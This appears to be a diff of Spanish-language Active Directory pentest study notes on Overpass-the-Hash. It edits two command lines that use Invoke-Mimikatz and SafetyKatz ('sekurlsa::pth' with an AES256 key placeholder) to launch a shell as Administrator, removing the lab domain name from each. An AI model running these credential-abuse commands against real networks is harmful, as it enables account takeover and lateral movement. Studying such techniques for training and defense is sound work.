@@ -38,9 +38,9 @@ OPTH genera tokens de hashes o keys.
 
 Con permisos de Administrador: 
 
-`Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator/domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"'`
+`Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator/domain: /aes256:<aes256key> /run:powershell.exe"'`
 
-`SafetyKatz.exe "sekurlsa::pth /user:administrator/domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"`
+`SafetyKatz.exe "sekurlsa::pth /user:administrator/domain: /aes256:<aes256keys> /run:cmd.exe" "exit"`
 
 Los comandos anteriores inician una sesión de PowerShell con un tipo de inicio de sesión 9 (mismo as runas /netonly)
 
